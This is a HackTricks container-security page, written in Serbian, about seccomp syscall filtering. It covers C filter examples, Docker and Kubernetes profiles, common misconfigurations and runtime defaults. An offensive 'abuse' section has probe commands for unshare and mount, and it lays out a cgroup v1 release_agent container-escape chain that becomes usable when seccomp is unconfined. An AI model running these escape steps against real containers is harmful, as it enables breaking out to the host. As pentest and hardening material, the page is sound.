# seccomp

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

**seccomp** je mehanizam koji omogućava kernelu da primeni filter na syscalls koje proces može pozvati. U containerized okruženjima, seccomp se obično koristi u filter modu tako da proces nije jednostavno označen kao "restricted" u neodređenom smislu, već podleže konkretnoj syscall politici. Ovo je važno zato što mnogi container breakouts zahtevaju pristup vrlo specifičnim kernel interfejsima. Ako proces ne može uspešno pozvati relevantne syscalls, velika klasa napada nestaje pre nego što bilo koja nijansa namespace ili capability postane relevantna.

Ključni mentalni model je jednostavan: namespaces odlučuju **šta proces može videti**, capabilities odlučuju **koje privilegovane akcije proces nominalno sme da pokuša**, a seccomp odlučuje **da li će kernel uopšte prihvatiti syscall ulaznu tačku za pokušanu akciju**. Zato seccomp često sprečava napade koji bi inače delovali mogući zasnovano samo na capabilities.

## Bezbednosni uticaj

Veliki deo opasne kernel surface je dostupan samo preko relativno malog skupa syscalls. Primeri koji se često pojavljuju pri hardeningu containera uključuju `mount`, `unshare`, `clone` ili `clone3` sa određenim flagovima, `bpf`, `ptrace`, `keyctl`, i `perf_event_open`. Napadač koji može da dosegne te syscalls može da kreira nove namespaces, manipuliše kernel subsistemima, ili interaguje sa attack surface koju normalnom aplikacionom containeru uopšte nije potrebna.

Zato su podrazumevani runtime seccomp profili izuzetno važni. Oni nisu samo "dodatna odbrana". U mnogim okruženjima oni predstavljaju razliku između containera koji može iskoristiti širok deo kernel funkcionalnosti i onog koji je ograničen na syscall površinu bližu onome što aplikacija zaista treba.

## Modovi i konstrukcija filtera

seccomp je istorijski imao strict mode u kome je bio dostupan samo mali skup syscalls, ali mod relevantan za moderne container runtimes je seccomp filter mode, često nazivan **seccomp-bpf**. U ovom modelu, kernel procenjuje filter program koji odlučuje da li treba dozvoliti syscall, odbiti ga sa errno, trap-ovati, logovati, ili ubiti proces. Container runtimes koriste ovaj mehanizam jer je dovoljno izražajan da blokira široke klase opasnih syscalls, a istovremeno dopušta normalno ponašanje aplikacija.

Dva low-level primera su korisna jer mehanizam čine konkretnijim umesto magičnim. Strict mode demonstrira stari model "only a minimal syscall set survives":
```c
#include <fcntl.h>
#include <linux/seccomp.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

int main(void) {
int output = open("output.txt", O_WRONLY);
const char *val = "test";
prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);
write(output, val, strlen(val) + 1);
open("output.txt", O_RDONLY);
}
```
Poslednji `open` uzrokuje da se proces ubije, jer nije deo minimalnog skupa strogog režima.

Primer libseccomp filtera jasnije prikazuje savremeni model politike:
```c
#include <errno.h>
#include <seccomp.h>
#include <stdio.h>
#include <unistd.h>

int main(void) {
scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EBADF), SCMP_SYS(getpid), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 2,
SCMP_A0(SCMP_CMP_EQ, 1),
SCMP_A2(SCMP_CMP_LE, 512));
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EBADF), SCMP_SYS(write), 1,
SCMP_A0(SCMP_CMP_NE, 1));
seccomp_load(ctx);
seccomp_release(ctx);
printf("pid=%d\n", getpid());
}
```
Ovaj stil politike je ono što većina čitalaca treba да замисли када помисле на runtime seccomp profiles.

## Lab

Jednostavan način да се потврди да је seccomp активан у containeru је:
```bash
docker run --rm debian:stable-slim sh -c 'grep Seccomp /proc/self/status'
docker run --rm --security-opt seccomp=unconfined debian:stable-slim sh -c 'grep Seccomp /proc/self/status'
```
Takođe možete pokušati operaciju koju podrazumevani profili obično ograničavaju:
```bash
docker run --rm debian:stable-slim sh -c 'apt-get update >/dev/null 2>&1 && apt-get install -y util-linux >/dev/null 2>&1 && unshare -Ur true'
```
Ako kontejner radi pod standardnim podrazumevanim seccomp profilom, `unshare`-stil operacije su često blokirane. Ovo je koristan primer jer pokazuje da čak i ako userspace alat postoji u image-u, kernel putanja koja mu je potrebna može i dalje biti nedostupna.
Ako kontejner radi pod standardnim podrazumevanim seccomp profilom, `unshare`-stil operacije su često blokirane čak i kada userspace alat postoji u image-u.

Za opštiji pregled statusa procesa, pokrenite:
```bash
grep -E 'Seccomp|NoNewPrivs' /proc/self/status
```
## Upotreba u runtime-u

Docker podržava i podrazumevane i prilagođene seccomp profile i omogućava administratorima da ih onemoguće pomoću `--security-opt seccomp=unconfined`. Podman ima sličnu podršku i često kombinuje seccomp sa rootless execution u razumnom podrazumevanom režimu. Kubernetes izlaže seccomp kroz konfiguraciju workload-a, gde je `RuntimeDefault` obično razumna osnovna postavka, dok `Unconfined` treba tretirati kao izuzetak koji zahteva opravdanje, a ne kao praktičan prekidač.

U okruženjima zasnovanim na containerd i CRI-O, tačan put je slojevitiji, ali princip je isti: engine višeg nivoa ili orchestrator odlučuje šta treba da se dogodi, a runtime na kraju instalira rezultujuću seccomp politiku za proces kontejnera. Ishod i dalje zavisi od finalne runtime konfiguracije koja stiže do kernela.

### Primer prilagođene politike

Docker i slični engine-i mogu učitati prilagođeni seccomp profil iz JSON-a. Minimalan primer koji zabranjuje `chmod` dok sve ostalo dopušta izgleda ovako:
```json
{
"defaultAction": "SCMP_ACT_ALLOW",
"syscalls": [
{
"name": "chmod",
"action": "SCMP_ACT_ERRNO"
}
]
}
```
Primenjeno pomoću:
```bash
docker run --rm -it --security-opt seccomp=/path/to/profile.json busybox chmod 400 /etc/hosts
```
Komanda ne uspeva sa `Operation not permitted`, što pokazuje da ograničenje potiče iz syscall policy-ja, a ne samo iz običnih dozvola fajlova. U stvarnom hardeningu, allowlists su generalno stroži od permissive defaults uz malu blacklist.

## Greške u konfiguraciji

Najgrublja greška je postaviti seccomp na **unconfined** zato što je aplikacija podrazumevano pala pod default policy. To je često tokom troubleshooting-a i veoma opasno kao trajno rešenje. Kada filter nestane, mnoge syscall-based breakout primitives ponovo postaju dostupne, posebno kada su prisutne moćne capabilities ili deljenje host namespace-a.

Drugi čest problem je korišćenje **custom permissive profile** koji je kopiran sa nekog bloga ili internog workaround-a bez pažljivog pregleda. Timovi ponekad zadržavaju skoro sve opasne syscalls jednostavno zato što je profil građen oko "stop the app from breaking" umesto "grant only what the app actually needs". Treća zabluda je pretpostavka da je seccomp manje važan za non-root kontejnere. U stvarnosti, mnogo kernel attack surface ostaje relevantno čak i kada proces nije UID 0.

## Zloupotreba

Ako seccomp nedostaje ili je znatno oslabljen, napadač može pozvati namespace-creation syscalls, proširiti reachable kernel attack surface kroz `bpf` ili `perf_event_open`, zloupotrebiti `keyctl`, ili kombinovati te syscall puteve sa opasnim capabilities kao što je `CAP_SYS_ADMIN`. U mnogim stvarnim napadima, seccomp nije jedina nedostajuća kontrola, ali njegov izostanak značajno skraćuje exploit path jer uklanja jednu od retkih odbrana koje mogu zaustaviti rizičan syscall pre nego što ostatak privilege model-a uopšte stupi na snagu.

Najkorisniji praktični test je pokušati tačno one syscall families koje default profili obično blokiraju. Ako iznenada rade, container posture se značajno promenila:
```bash
grep Seccomp /proc/self/status
unshare -Ur true 2>/dev/null && echo "unshare works"
unshare -m true 2>/dev/null && echo "mount namespace creation works"
```
Ako je prisutan `CAP_SYS_ADMIN` ili neka druga snažna capability, proverite da li je seccomp jedina preostala barijera pre mount-based abuse:
```bash
capsh --print | grep cap_sys_admin
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -t proc proc /tmp/m 2>/dev/null && echo "proc mount works"
```
Na nekim ciljevima neposredna vrednost nije potpuno bekstvo, već prikupljanje informacija i proširenje površine napada na kernel. Ove komande pomažu да се утврди да ли су посебно осетљиви syscall путеви достижни:
```bash
which unshare nsenter strace 2>/dev/null
strace -e bpf,perf_event_open,keyctl true 2>&1 | tail
```
Ako seccomp nije prisutan i container je na drugi način privilegovan, tada ima smisla pivotirati na specifičnije breakout tehnike koje su već dokumentovane na legacy container-escape stranicama.

### Potpuni primer: seccomp je bio jedina stvar koja je blokirala `unshare`

Na mnogim ciljevima, praktična posledica uklanjanja seccomp-a je da kreiranje namespace-a ili mount syscalls iznenada počnu da rade. Ako container takođe ima `CAP_SYS_ADMIN`, sledeći niz radnji može postati moguć:
```bash
grep Seccomp /proc/self/status
capsh --print | grep cap_sys_admin
mkdir -p /tmp/nsroot
unshare -m sh -c '
mount -t tmpfs tmpfs /tmp/nsroot &&
mkdir -p /tmp/nsroot/proc &&
mount -t proc proc /tmp/nsroot/proc &&
mount | grep /tmp/nsroot
'
```
Samo po sebi ovo još nije host escape, ali pokazuje da je seccomp bio barijera koja je sprečavala mount-related exploitation.

### Potpun primer: seccomp onemogućen + cgroup v1 `release_agent`

Ako je seccomp onemogućen i kontejner može da mount-uje cgroup v1 hijerarhije, `release_agent` tehnika iz cgroups sekcije postaje dostupna:
```bash
grep Seccomp /proc/self/status
mount | grep cgroup
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Ovo nije seccomp-only exploit. Poenta je da, kada seccomp postane unconfined, syscall-heavy breakout chains koje su ranije bile blokirane mogu početi da rade tačno onako kako su napisane.

## Provere

Svrha ovih provera je da utvrde da li je seccomp uopšte aktivan, da li mu prati `no_new_privs`, i da li runtime konfiguracija eksplicitno pokazuje da je seccomp onemogućen.
```bash
grep Seccomp /proc/self/status                               # Current seccomp mode from the kernel
cat /proc/self/status | grep NoNewPrivs                      # Whether exec-time privilege gain is also blocked
docker inspect <container> | jq '.[0].HostConfig.SecurityOpt'   # Runtime security options, including seccomp overrides
```
Zanimljivo ovde:

- Nenulta vrednost `Seccomp` znači da je filtriranje aktivno; `0` obično znači odsustvo seccomp zaštite.
- Ako runtime bezbednosne opcije uključuju `seccomp=unconfined`, workload je izgubio jednu od najkorisnijih odbrana na nivou syscall-a.
- `NoNewPrivs` nije sam seccomp, ali istovremeno prisustvo oba obično ukazuje na pažljiviji hardening nego odsustvo oboje.

Ako container već ima sumnjive mounts, broad capabilities, ili shared host namespaces, i seccomp je takođe unconfined, ta kombinacija treba da se tretira kao ozbiljan signal eskalacije. Container i dalje možda nije trivijalno probiti, ali broj kernel entry points dostupnih napadaču znatno se povećao.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Usually enabled by default | Uses Docker's built-in default seccomp profile unless overridden | `--security-opt seccomp=unconfined`, `--security-opt seccomp=/path/profile.json`, `--privileged` |
| Podman | Usually enabled by default | Applies the runtime default seccomp profile unless overridden | `--security-opt seccomp=unconfined`, `--security-opt seccomp=profile.json`, `--seccomp-policy=image`, `--privileged` |
| Kubernetes | **Not guaranteed by default** | If `securityContext.seccompProfile` is unset, the default is `Unconfined` unless the kubelet enables `--seccomp-default`; `RuntimeDefault` or `Localhost` must otherwise be set explicitly | `securityContext.seccompProfile.type: Unconfined`, leaving seccomp unset on clusters without `seccompDefault`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Follows Kubernetes node and Pod settings | Runtime profile is used when Kubernetes asks for `RuntimeDefault` or when kubelet seccomp defaulting is enabled | Same as Kubernetes row; direct CRI/OCI configuration can also omit seccomp entirely |

Kubernetes ponašanje je ono što najčešće iznenađuje operatere. U mnogim klasterima, seccomp je i dalje odsutan osim ako Pod to ne zatraži ili ako kubelet nije konfigurisan da podrazumevano koristi `RuntimeDefault`.
{{#include ../../../../banners/hacktricks-training.md}}
